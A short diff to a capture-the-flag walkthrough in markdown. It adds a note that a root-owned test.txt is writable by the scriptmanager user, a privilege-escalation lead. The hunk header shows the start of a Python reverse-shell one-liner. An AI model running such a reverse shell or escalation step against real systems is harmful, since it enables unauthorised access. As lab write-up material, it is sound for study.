@@ -42,6 +42,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/896f8a81-478c-41a0-a6e9-5729b1894204)
 
 + **scripts** directory is interesting: `cd scripts`
++ test.txt file is owned by **root** but it is writable by **scriptmanager**.
 + `ls -la`
 + `cat test.py`
 + `cat test.txt`
